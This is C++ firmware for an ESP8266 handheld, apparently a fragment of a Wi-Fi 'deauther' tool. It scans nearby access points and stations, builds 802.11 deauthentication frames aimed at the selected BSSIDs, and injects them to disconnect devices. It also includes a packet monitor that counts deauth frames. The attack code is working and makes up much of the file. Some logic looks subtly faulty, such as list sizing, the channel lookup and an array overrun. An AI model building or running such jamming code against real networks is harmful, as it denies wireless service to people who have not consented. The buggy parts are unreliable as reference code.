void scanAps() {
  setLedScan();
  firstApScan = true;
  apList.clear();
  selectedApList.resize(apList.size(), false);
  wifi_promiscuous_enable(0);
  wifi_set_promiscuous_rx_cb(nullptr);
  WiFi.mode(WIFI_OFF);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  int n = WiFi.scanNetworks();
  for (int i = 0; i < n; ++i) {
    String ssid = WiFi.SSID(i);
    uint8_t* bssid = WiFi.BSSID(i);
    bool exists = false;
    for (const auto& ap : apList) {
      if (ap.ssid == ssid && ap.bssid == bssid) {
        exists = true;
        break;
      }
    }
    if (!exists) {
      apList.push_back({ ssid, bssid });
    }
  }
  activem->addSection(("Found " + String(n) + " APs").c_str());
  activem->render();
  delay(1000);
  activem = apScanm->getParentMenu();
  setLedNormal();
  activem->render();
}
void scanSts() {
  setLedScan();
  stList.clear();
  selectedStList.resize(apList.size(), false);
  wifi_promiscuous_enable(0);
  wifi_set_promiscuous_rx_cb(nullptr);
  WiFi.mode(WIFI_OFF);
  WiFi.mode(WIFI_AP_STA);
  int n = WiFi.scanNetworks();
  for (int i = 0; i < n; ++i) {
    String ssid = WiFi.SSID(i);
    uint8_t* bssid = WiFi.BSSID(i);
    int rssi = WiFi.RSSI(i);
    bool exists = false;
    for (const auto& station : stList) {
      if (station.ssid == ssid && station.bssid == bssid) {
        exists = true;
        break;
      }
    }
    if (!exists) {
      stList.push_back({ ssid, bssid, rssi });
    }
  }
  activem->addSection(("Found " + String(n) + " STs").c_str());
  activem->render();
  delay(1000);
  activem = stScanm->getParentMenu();
  setLedNormal();
  activem->render();
}
uint8_t* createDeauthPacket(uint8_t* bssid) {
  uint8_t* endPacket = deauthPacket;
  for (int i = 0; i < 6; i++) {
    endPacket[10 + i] = endPacket[16 + i] = bssid[i];
  }
  return endPacket;
}
void deauth() {
  WiFi.mode(WIFI_STA);
  for (int i = 0; i < apList.size(); i++) {
    if (selectedApList[i] && deauthing) {
      wifi_set_channel(WiFi.channel(i));
      wifi_send_pkt_freedom(createDeauthPacket(apList[i].bssid), 26, 0);
      delay(20);
      activem->handleInput();
    }
  }
  WiFi.mode(WIFI_AP_STA);
  for (int i = 0; i < stList.size(); i++) {
    if (selectedStList[i] && deauthing) {
      wifi_set_channel(WiFi.channel(i));
      wifi_send_pkt_freedom(createDeauthPacket(stList[i].bssid), 26, 0);
      delay(20);
      activem->handleInput();
    }
  }
  if (deauthing) {
    for (int i = 0; i < 200; i++) {
      activem->handleInput();
      delay(1);
    }
  }
}
void sniffer(uint8_t* buf, uint16_t len) {
  pkts++;
  if (buf[12] == 0xA0 || buf[12] == 0xC0) {
    deauths++;
  }
}
void getMultiplicator() {
  maxVal = 1;
  for (int i = 0; i < maxRow; i++) {
    if (val[i] > maxVal) maxVal = val[i];
  }
  if (maxVal > LineVal) multiplicator = (double)LineVal / (double)maxVal;
  else multiplicator = 1;
}
void packetMonitor() {
  curTime = millis();
  if (!monitor) {
    wifi_set_opmode(STATION_MODE);
    wifi_promiscuous_enable(0);
    WiFi.disconnect();
    wifi_set_promiscuous_rx_cb(sniffer);
    wifi_set_channel(curChannel);
    wifi_promiscuous_enable(1);
    dis.clearDisplay();
    dis.setTextColor(SH110X_WHITE);
    //curChannel++;
    if (curChannel > maxCh) curChannel = 1;
    if(curChannel < 1) curChannel = maxCh;
    wifi_set_channel(curChannel);
    for (int i = 0; i < maxRow; i++) val[i] = 0;
    pkts = 0;
    multiplicator = 1;
    if (pkts == 0) pkts = deauths;
    no_deauths = pkts - deauths;
  }
  monitor = true;


  dis.clearDisplay();
  dis.drawLine(minRow, Line, maxRow, Line, SH110X_WHITE);
  dis.setCursor(Row1, LineText);
  dis.print("Ch:");
  dis.setCursor(Row3, LineText);
  dis.print("Pkts:");
  dis.setCursor(Row5, LineText);
  dis.print("DA:");
  dis.setCursor(Row2, LineText);
  dis.print(curChannel);
  dis.setCursor(Row4, LineText);
  dis.print(no_deauths);
  dis.setCursor(Row6, LineText);
  dis.print(deauths);
  for (int i = 0; i < maxRow; i++) {
    dis.drawLine(i, maxLine, i, maxLine - val[i] * multiplicator, SH110X_WHITE);
  }
  dis.display();

  if (curTime - prevTime >= 500) {
    prevTime = curTime;

    for (int i = 0; i < maxRow; i++) {
      val[i] = val[i + 1];
    }
    val[127] = pkts;
    getMultiplicator();
    if (pkts == 0) pkts = deauths;
    no_deauths = pkts - deauths;
    dis.clearDisplay();
    dis.drawLine(minRow, Line, maxRow, Line, SH110X_WHITE);
    dis.setCursor(Row1, LineText);
    dis.print("Ch:");
    dis.setCursor(Row3, LineText);
    dis.print("Pkts:");
    dis.setCursor(Row5, LineText);
    dis.print("DA:");
    dis.setCursor(Row2, LineText);
    dis.print(curChannel);
    dis.setCursor(Row4, LineText);
    dis.print(no_deauths);
    dis.setCursor(Row6, LineText);
    dis.print(deauths);
    for (int i = 0; i < maxRow; i++) {
      dis.drawLine(i, maxLine, i, maxLine - val[i] * multiplicator, SH110X_WHITE);
    }
    dis.display();
    deauths = 0;
    pkts = 0;
  }
}